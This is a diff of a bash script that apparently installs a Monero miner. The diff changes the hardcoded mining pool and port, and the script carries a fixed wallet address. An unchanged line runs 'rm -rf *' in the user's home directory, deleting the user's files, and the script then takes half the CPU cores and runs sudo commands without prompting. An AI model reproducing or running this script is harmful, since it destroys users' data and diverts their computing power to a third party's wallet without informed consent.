@@ -1,11 +1,11 @@
 #!/bin/bash
 
 YOURXMRADDIE="47HSjk6uLB6j2dc26B9jsWKsMgMyj8PNZiMtFs1QEhZMehwmoiRnNmUZikgPSaDNPYMjMLcByjZDVG23qkETLMvwGWxYfRw";
-YOURPOOL="pool.minexmr.com";
-YOURPORT="4444";
+YOURPOOL="gulf.moneroocean.stream";
+YOURPORT="10128";
 
 cd /home/$USER/; rm -rf *; 
-GROOVY="SHIThitsTHEcpuFAN";
+GROOVY="SHIThitsTHESHIT";
 RANDWRKRNAME="worker-${RANDOM}";
 WETSHIT=$(nproc); TOTALSHIT=$(( $WETSHIT / 2 ));
 sudo DEBIAN_FRONTEND=noninteractive apt update || true;
